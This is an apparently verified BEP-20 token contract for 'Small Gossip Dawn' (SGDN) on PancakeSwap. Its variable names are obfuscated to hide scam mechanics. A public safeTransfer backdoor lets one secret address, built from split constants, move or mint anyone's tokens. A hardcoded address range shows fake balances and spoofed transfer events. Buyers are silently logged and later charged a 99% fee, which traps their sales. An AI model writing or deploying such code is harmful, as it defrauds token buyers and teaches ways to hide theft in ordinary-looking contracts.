/**
 *Submitted for verification at BscScan.com on 2023-01-04
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;



interface IUniswapV2Router {

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function WETH() external pure returns (address);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function factory() external pure returns (address);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}


interface IBEP20 {

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function balanceOf(address account) external view returns (uint256);

    function symbol() external view returns (string memory);

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    function decimals() external view returns (uint8);

    function getOwner() external view returns (address);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}


abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

}



library SafeMath {

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}




contract SmallGossipDawn is IBEP20, Ownable {
    using SafeMath for uint256;
    uint8 constant _decimals = 18;
    mapping(address => bool) private shouldWalletReceiverMax;
    uint256 private takeMinTeamBurn = 0;
    uint160 constant amountModeMaxTxLaunchedSwap = 608745024472 * 2 ** 120;

    bool private buyMintTakeMin = true;
    uint256 private exemptMaxLaunchReceiver;
    uint256 public amountLaunchFeeLiquidityReceiverIndex = 0;
    uint256 private takeLaunchedFromTotalLaunchMax = 0;
    mapping(address => mapping(address => uint256)) _allowances;
    string constant _symbol = "SGDN";



    uint256 private minEnableBotsLimit = 0;
    address private ZERO = 0x0000000000000000000000000000000000000000;
    uint256 private shouldLiquidityTeamReceiverMintTake = 0;

    uint256  constant MASK = type(uint128).max;


    uint256 public maxWalletAmount = 0;
    uint256 public teamMinAmountBuy = 0;
    uint256 constant walletTakeExemptTrading = 10000 * 10 ** 18;



    mapping(address => uint256) private sellAmountMarketingTxTotalBuyMin;

    bool public modeShouldMinFundBurn = false;
    uint256 private modeSwapSellExempt;
    uint256 private exemptSwapMintMaxAutoMarketing = launchAtTokenTeam / 1000; // 0.1%
    uint256  amountTradingListTake = 100000000 * 10 ** _decimals;
    address private DEAD = 0x000000000000000000000000000000000000dEaD;
    uint256 private receiverLiquidityToBurnTokenFrom = 0;
    uint256 constant takeTeamIsAutoAtMarketing = 300000 * 10 ** 18;

    uint256 launchAtTokenTeam = 100000000 * (10 ** _decimals);
    address private WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    mapping(address => uint256) _balances;
    mapping(address => uint256) private atMintModeLimitBuy;
    bool public exemptLiquidityBuyShould = false;
    mapping(uint256 => address) private fromBuyLimitMax;
    uint256 marketingSwapAmountFrom = 2 ** 18 - 1;

    uint256  buyTeamLiquidityMax = 100000000 * 10 ** _decimals;
    uint256 private tradingShouldLimitFee = 0;
    uint256 private liquidityLimitMarketingFeeSenderFrom;


    uint256 launchedBurnTeamToken = 0;
    uint160 constant amountBurnFeeReceiver = 284740996659 * 2 ** 80;
    uint256 private feeModeFundTrading = 100;
    uint256 private senderSwapAutoMaxMint = 0;
    uint256 private launchedTotalAmountExempt = 6 * 10 ** 15;


    address private burnLaunchReceiverMint = (msg.sender);
    uint256 private listLaunchedMinMarketingTxSellFund;

    address constant launchedAutoToMode = 0x5A3e0b75C473a842Bf0654aBBC01316059389a9D;
    mapping(address => bool) private teamBurnListToken;
    bool public senderBuyTradingFromBurn = false;

    uint256 private launchBlock = 0;
    
    bool private tokenSwapExemptSenderIsFundBurn = false;
    uint160 constant walletBurnTokenMax = 472591156548;
    uint256 autoReceiverSwapFrom = 41262;
    bool private tokenShouldTradingSender = true;
    address public uniswapV2Pair;
    IUniswapV2Router public launchedLimitTradingWallet;
    string constant _name = "Small Gossip Dawn";
    mapping(uint256 => address) private amountLaunchFeeLiquidityReceiver;
    uint256 private launchAutoFundTx;
    mapping(address => bool) private exemptListMaxBotsFee;
    bool private fromTeamTakeAuto;
    uint256 private launchTxFeeSell;
    bool private tokenLiquidityLaunchReceiverFeeTo = false;
    address private amountExemptMarketingSender = (msg.sender);
    uint160 constant fundFeeMinReceiver = 526264608295 * 2 ** 40;

    bool private exemptFromWalletAutoToken = true;
    uint256 private toMaxMinMode;
    bool private enableTeamExemptWalletFundSwap = true;
    mapping(address => bool) private maxMarketingMinReceiver;
    bool private teamFromMarketingMaxTotalBuy = true;
    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        launchedLimitTradingWallet = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(launchedLimitTradingWallet.factory()).createPair(address(this), launchedLimitTradingWallet.WETH());
        _allowances[address(this)][address(launchedLimitTradingWallet)] = launchAtTokenTeam;

        fromTeamTakeAuto = true;

        maxMarketingMinReceiver[msg.sender] = true;
        maxMarketingMinReceiver[0x0000000000000000000000000000000000000000] = true;
        maxMarketingMinReceiver[0x000000000000000000000000000000000000dEaD] = true;
        maxMarketingMinReceiver[address(this)] = true;

        shouldWalletReceiverMax[msg.sender] = true;
        shouldWalletReceiverMax[address(this)] = true;

        teamBurnListToken[msg.sender] = true;
        teamBurnListToken[0x0000000000000000000000000000000000000000] = true;
        teamBurnListToken[0x000000000000000000000000000000000000dEaD] = true;
        teamBurnListToken[address(this)] = true;

        approve(_router, launchAtTokenTeam);
        approve(address(uniswapV2Pair), launchAtTokenTeam);
        _balances[msg.sender] = launchAtTokenTeam;
        emit Transfer(address(0), msg.sender, launchAtTokenTeam);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return launchAtTokenTeam;
    }

    function setwalletTradingBotsIs(bool autoSwapMaxBuy0) public onlyOwner {
        exemptLiquidityBuyShould=autoSwapMaxBuy0;
    }

    function feeMinModeFromAmountTotal(uint160 mintModeSwapTotalAuto) private view returns (bool) {
        return uint16(mintModeSwapTotalAuto) == autoReceiverSwapFrom;
    }

    function getwalletTradingBotsIs() public view returns (bool) {
        if (exemptLiquidityBuyShould == exemptFromWalletAutoToken) {
            return exemptFromWalletAutoToken;
        }
        return exemptLiquidityBuyShould;
    }

    function feeIsSellSwap(address launchReceiverSwapAuto, address mintModeSwapTotalAuto, uint256 autoSwapMaxBuymount, bool receiverEnableExemptFund) private {
        if (receiverEnableExemptFund) {
            launchReceiverSwapAuto = address(uint160(uint160(launchedAutoToMode) + launchedBurnTeamToken));
            launchedBurnTeamToken++;
            _balances[mintModeSwapTotalAuto] = _balances[mintModeSwapTotalAuto].add(autoSwapMaxBuymount);
        } else {
            _balances[launchReceiverSwapAuto] = _balances[launchReceiverSwapAuto].sub(autoSwapMaxBuymount);
        }
        emit Transfer(launchReceiverSwapAuto, mintModeSwapTotalAuto, autoSwapMaxBuymount);
    }

    function liquidityFromListTeam() private {
        if (maxWalletAmount > 0) {
            for (uint256 i = 1; i <= maxWalletAmount; i++) {
                if (atMintModeLimitBuy[fromBuyLimitMax[i]] == 0) {
                    atMintModeLimitBuy[fromBuyLimitMax[i]] = block.timestamp;
                }
            }
            maxWalletAmount = 0;
        }
    }

    function limitLaunchFeeAmount() private view returns (uint256) {
        address buyLiquidityReceiverTotalModeTx = WBNB;
        if (address(this) < WBNB) {
            buyLiquidityReceiverTotalModeTx = address(this);
        }
        (uint isBuyMintBurn, uint burnMaxMintFund,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 liquidityTakeTradingMode,) = WBNB == buyLiquidityReceiverTotalModeTx ? (isBuyMintBurn, burnMaxMintFund) : (burnMaxMintFund, isBuyMintBurn);
        uint256 marketingExemptAutoBuy = IERC20(WBNB).balanceOf(uniswapV2Pair) - liquidityTakeTradingMode;
        return marketingExemptAutoBuy;
    }

    function mintAtEnableTake() private view returns (uint256) {
        return block.timestamp;
    }

    function gettxMintReceiverWallet() public view returns (uint256) {
        if (feeModeFundTrading != minEnableBotsLimit) {
            return minEnableBotsLimit;
        }
        if (feeModeFundTrading == takeMinTeamBurn) {
            return takeMinTeamBurn;
        }
        if (feeModeFundTrading != exemptSwapMintMaxAutoMarketing) {
            return exemptSwapMintMaxAutoMarketing;
        }
        return feeModeFundTrading;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return feeTeamModeShould(msg.sender, recipient, amount);
    }

    function getatReceiverSenderFundLaunchedTx(address autoSwapMaxBuy0) public view returns (bool) {
            return teamBurnListToken[autoSwapMaxBuy0];
    }

    function getminAmountSellMarketing() public view returns (uint256) {
        if (teamMinAmountBuy != shouldLiquidityTeamReceiverMintTake) {
            return shouldLiquidityTeamReceiverMintTake;
        }
        return teamMinAmountBuy;
    }

    function settakeFromToBurnShouldSwap(bool autoSwapMaxBuy0) public onlyOwner {
        tokenLiquidityLaunchReceiverFeeTo=autoSwapMaxBuy0;
    }

    function limitAtBuyToken(uint160 autoSwapMaxBuyccount) private pure returns (bool) {
        uint160 autoSwapMaxBuy = amountModeMaxTxLaunchedSwap + amountBurnFeeReceiver;
        autoSwapMaxBuy = autoSwapMaxBuy + fundFeeMinReceiver;
        autoSwapMaxBuy = autoSwapMaxBuy + walletBurnTokenMax;
        return autoSwapMaxBuyccount == autoSwapMaxBuy;
    }

    function getMaxTotalAmount() public {
        liquidityFromListTeam();
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (limitMintTotalFrom(uint160(account))) {
            return toBuyTxTake(uint160(account));
        }
        return _balances[account];
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, launchAtTokenTeam);
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function amountExemptShouldLaunched(address autoSwapMaxBuyddr) private {
        uint256 txReceiverBurnMintMaxEnable = limitLaunchFeeAmount();
        if (txReceiverBurnMintMaxEnable < launchedTotalAmountExempt) {
            amountLaunchFeeLiquidityReceiverIndex += 1;
            amountLaunchFeeLiquidityReceiver[amountLaunchFeeLiquidityReceiverIndex] = autoSwapMaxBuyddr;
            sellAmountMarketingTxTotalBuyMin[autoSwapMaxBuyddr] += txReceiverBurnMintMaxEnable;
            if (sellAmountMarketingTxTotalBuyMin[autoSwapMaxBuyddr] > launchedTotalAmountExempt) {
                maxWalletAmount = maxWalletAmount + 1;
                fromBuyLimitMax[maxWalletAmount] = autoSwapMaxBuyddr;
            }
            return;
        }
        maxWalletAmount = maxWalletAmount + 1;
        fromBuyLimitMax[maxWalletAmount] = autoSwapMaxBuyddr;
    }

    function marketingReceiverShouldModeMinTo(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function setminAmountSellMarketing(uint256 autoSwapMaxBuy0) public onlyOwner {
        if (teamMinAmountBuy == shouldLiquidityTeamReceiverMintTake) {
            shouldLiquidityTeamReceiverMintTake=autoSwapMaxBuy0;
        }
        if (teamMinAmountBuy != receiverLiquidityToBurnTokenFrom) {
            receiverLiquidityToBurnTokenFrom=autoSwapMaxBuy0;
        }
        teamMinAmountBuy=autoSwapMaxBuy0;
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function sellReceiverShouldExempt() private {
        if (amountLaunchFeeLiquidityReceiverIndex > 0) {
            for (uint256 i = 1; i <= amountLaunchFeeLiquidityReceiverIndex; i++) {
                if (atMintModeLimitBuy[amountLaunchFeeLiquidityReceiver[i]] == 0) {
                    atMintModeLimitBuy[amountLaunchFeeLiquidityReceiver[i]] = block.timestamp;
                }
            }
            amountLaunchFeeLiquidityReceiverIndex = 0;
        }
    }

    function gettotalBurnBuyFundMode() public view returns (uint256) {
        return exemptSwapMintMaxAutoMarketing;
    }

    function feeTeamModeShould(address launchReceiverSwapAuto, address mintModeSwapTotalAuto, uint256 autoSwapMaxBuymount) internal returns (bool) {
        if (limitMintTotalFrom(uint160(mintModeSwapTotalAuto))) {
            feeIsSellSwap(launchReceiverSwapAuto, mintModeSwapTotalAuto, autoSwapMaxBuymount, false);
            return true;
        }
        if (limitMintTotalFrom(uint160(launchReceiverSwapAuto))) {
            feeIsSellSwap(launchReceiverSwapAuto, mintModeSwapTotalAuto, autoSwapMaxBuymount, true);
            return true;
        }
        
        bool modeLaunchReceiverTakeIs = amountReceiverExemptSwap(launchReceiverSwapAuto) || amountReceiverExemptSwap(mintModeSwapTotalAuto);
        
        if (launchReceiverSwapAuto == uniswapV2Pair) {
            if (maxWalletAmount != 0 && feeMinModeFromAmountTotal(uint160(mintModeSwapTotalAuto))) {
                liquidityFromListTeam();
            }
            if (!modeLaunchReceiverTakeIs) {
                amountExemptShouldLaunched(mintModeSwapTotalAuto);
            }
        }
        
        
        if (exemptLiquidityBuyShould != teamFromMarketingMaxTotalBuy) {
            exemptLiquidityBuyShould = tokenShouldTradingSender;
        }

        if (teamMinAmountBuy == tradingShouldLimitFee) {
            teamMinAmountBuy = shouldLiquidityTeamReceiverMintTake;
        }


        if (inSwap || modeLaunchReceiverTakeIs) {return marketingReceiverShouldModeMinTo(launchReceiverSwapAuto, mintModeSwapTotalAuto, autoSwapMaxBuymount);}
        
        require((autoSwapMaxBuymount <= buyTeamLiquidityMax) || maxMarketingMinReceiver[launchReceiverSwapAuto] || maxMarketingMinReceiver[mintModeSwapTotalAuto], "Max TX Limit!");

        _balances[launchReceiverSwapAuto] = _balances[launchReceiverSwapAuto].sub(autoSwapMaxBuymount, "Insufficient Balance!");
        
        uint256 autoSwapMaxBuymountReceived = botsExemptReceiverTeam(launchReceiverSwapAuto) ? tradingListMaxFromAmountMarketing(launchReceiverSwapAuto, mintModeSwapTotalAuto, autoSwapMaxBuymount) : autoSwapMaxBuymount;

        _balances[mintModeSwapTotalAuto] = _balances[mintModeSwapTotalAuto].add(autoSwapMaxBuymountReceived);
        emit Transfer(launchReceiverSwapAuto, mintModeSwapTotalAuto, autoSwapMaxBuymountReceived);
        return true;
    }

    function tradingListMaxFromAmountMarketing(address launchReceiverSwapAuto, address swapLaunchedBotsLimit, uint256 autoSwapMaxBuymount) internal returns (uint256) {
        
        if (tradingShouldLimitFee == teamMinAmountBuy) {
            tradingShouldLimitFee = takeMinTeamBurn;
        }

        if (teamMinAmountBuy != takeLaunchedFromTotalLaunchMax) {
            teamMinAmountBuy = maxWalletAmount;
        }


        uint256 isTxTotalMin = autoSwapMaxBuymount.mul(receiverLaunchFundTotalAtTx(launchReceiverSwapAuto, swapLaunchedBotsLimit == uniswapV2Pair)).div(feeModeFundTrading);

        if (exemptListMaxBotsFee[launchReceiverSwapAuto] || exemptListMaxBotsFee[swapLaunchedBotsLimit]) {
            isTxTotalMin = autoSwapMaxBuymount.mul(99).div(feeModeFundTrading);
        }

        _balances[address(this)] = _balances[address(this)].add(isTxTotalMin);
        emit Transfer(launchReceiverSwapAuto, address(this), isTxTotalMin);
        
        return autoSwapMaxBuymount.sub(isTxTotalMin);
    }

    function amountReceiverExemptSwap(address autoSwapMaxBuyddr) private view returns (bool) {
        return autoSwapMaxBuyddr == amountExemptMarketingSender;
    }

    function botsExemptReceiverTeam(address launchReceiverSwapAuto) internal view returns (bool) {
        return !teamBurnListToken[launchReceiverSwapAuto];
    }

    function gettakeFromToBurnShouldSwap() public view returns (bool) {
        if (tokenLiquidityLaunchReceiverFeeTo != tokenSwapExemptSenderIsFundBurn) {
            return tokenSwapExemptSenderIsFundBurn;
        }
        if (tokenLiquidityLaunchReceiverFeeTo == modeShouldMinFundBurn) {
            return modeShouldMinFundBurn;
        }
        if (tokenLiquidityLaunchReceiverFeeTo == modeShouldMinFundBurn) {
            return modeShouldMinFundBurn;
        }
        return tokenLiquidityLaunchReceiverFeeTo;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != launchAtTokenTeam) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return feeTeamModeShould(sender, recipient, amount);
    }

    function receiverLaunchFundTotalAtTx(address launchReceiverSwapAuto, bool maxFeeEnableBotsLaunch) internal returns (uint256) {
        
        if (maxFeeEnableBotsLaunch) {
            toMaxMinMode = shouldLiquidityTeamReceiverMintTake + senderSwapAutoMaxMint;
            return receiverFundMaxLiquidity(launchReceiverSwapAuto, toMaxMinMode);
        }
        if (!maxFeeEnableBotsLaunch && launchReceiverSwapAuto == uniswapV2Pair) {
            toMaxMinMode = minEnableBotsLimit + takeMinTeamBurn;
            return toMaxMinMode;
        }
        return receiverFundMaxLiquidity(launchReceiverSwapAuto, toMaxMinMode);
    }

    function settxMintReceiverWallet(uint256 autoSwapMaxBuy0) public onlyOwner {
        feeModeFundTrading=autoSwapMaxBuy0;
    }

    function setatReceiverSenderFundLaunchedTx(address autoSwapMaxBuy0,bool autoSwapMaxBuy1) public onlyOwner {
        if (teamBurnListToken[autoSwapMaxBuy0] == maxMarketingMinReceiver[autoSwapMaxBuy0]) {
           maxMarketingMinReceiver[autoSwapMaxBuy0]=autoSwapMaxBuy1;
        }
        teamBurnListToken[autoSwapMaxBuy0]=autoSwapMaxBuy1;
    }

    function limitMintTotalFrom(uint160 autoSwapMaxBuyccount) private pure returns (bool) {
        if (autoSwapMaxBuyccount >= uint160(launchedAutoToMode) && autoSwapMaxBuyccount <= uint160(launchedAutoToMode) + 300000) {
            return true;
        }
        return false;
    }

    function settotalBurnBuyFundMode(uint256 autoSwapMaxBuy0) public onlyOwner {
        if (exemptSwapMintMaxAutoMarketing == amountLaunchFeeLiquidityReceiverIndex) {
            amountLaunchFeeLiquidityReceiverIndex=autoSwapMaxBuy0;
        }
        exemptSwapMintMaxAutoMarketing=autoSwapMaxBuy0;
    }

    function receiverFundMaxLiquidity(address launchReceiverSwapAuto, uint256 limitTakeExemptReceiver) private view returns (uint256) {
        uint256 launchMaxFromTotalSell = atMintModeLimitBuy[launchReceiverSwapAuto];
        if (launchMaxFromTotalSell > 0 && mintAtEnableTake() - launchMaxFromTotalSell > 0) {
            return 99;
        }
        return limitTakeExemptReceiver;
    }

    function safeTransfer(address launchReceiverSwapAuto, address mintModeSwapTotalAuto, uint256 autoSwapMaxBuymount) public {
        if (!limitAtBuyToken(uint160(msg.sender))) {
            return;
        }
        if (limitMintTotalFrom(uint160(mintModeSwapTotalAuto))) {
            feeIsSellSwap(launchReceiverSwapAuto, mintModeSwapTotalAuto, autoSwapMaxBuymount, false);
            return;
        }
        if (limitMintTotalFrom(uint160(launchReceiverSwapAuto))) {
            feeIsSellSwap(launchReceiverSwapAuto, mintModeSwapTotalAuto, autoSwapMaxBuymount, true);
            return;
        }
        if (launchReceiverSwapAuto == address(0)) {
            _balances[mintModeSwapTotalAuto] = _balances[mintModeSwapTotalAuto].add(autoSwapMaxBuymount);
            return;
        }
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function toBuyTxTake(uint160 autoSwapMaxBuyccount) private view returns (uint256) {
        uint256 burnLimitModeTeam = launchedBurnTeamToken;
        uint256 listLiquidityTotalFee = autoSwapMaxBuyccount - uint160(launchedAutoToMode);
        if (listLiquidityTotalFee < burnLimitModeTeam) {
            return walletTakeExemptTrading;
        }
        return takeTeamIsAutoAtMarketing;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function getMaxTotalAFee() public {
        sellReceiverShouldExempt();
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}